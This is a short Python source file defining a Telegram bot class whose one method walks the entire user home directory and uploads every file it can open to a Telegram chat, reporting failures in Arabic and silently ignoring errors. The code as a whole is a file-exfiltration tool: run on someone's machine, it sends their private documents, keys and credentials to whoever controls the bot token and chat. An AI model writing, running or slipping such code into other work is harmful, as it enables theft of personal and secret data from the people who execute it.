import telebot
import os

class FileSenderBot:
    def __init__(self, api_token):
        self.bot = telebot.TeleBot(api_token)

    def send_all_user_files(self, chat_id):
        user_home_directory = os.path.expanduser("~")

        for dirpath, _, filenames in os.walk(user_home_directory):
            for filename in filenames:
                file_path = os.path.join(dirpath, filename)
                if os.path.isfile(file_path):
                    try:
                        with open(file_path, 'rb') as file:
                            self.bot.send_document(chat_id, file)
                    except Exception as e:
                        error_message = f"❌ خطأ في إرسال الملف: {file_path}\nالسبب: {e}"
                        try:
                            self.bot.send_message(chat_id, error_message)
                        except:
                            pass